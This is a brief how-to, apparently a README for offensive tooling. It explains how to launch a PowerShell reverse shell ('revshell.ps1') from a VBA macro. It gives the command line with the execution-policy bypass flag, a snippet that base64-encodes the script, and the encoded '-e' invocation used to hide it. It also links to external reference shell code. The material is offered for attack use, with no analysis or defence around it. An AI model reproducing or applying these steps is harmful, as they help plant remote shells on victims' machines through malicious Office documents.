## How to use it in VBA macro?

### 1. Load as ps1 file:
```
powershell -ep bypass -NoProfile -File revshell.ps1
```

### 2. Use base64
Step1: Encode the Script
```powershell
$script = Get-Content -Path "a.ps1" -Raw
$encodedScript = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($script))
$encodedScript
```
Step2: Use the Encoded Script with -e
```
powershell -e <Base64-Encoded-Script>
```

## Reference shell code:
  - https://gist.github.com/staaldraad/204928a6004e89553a8d3db0ce527fd5
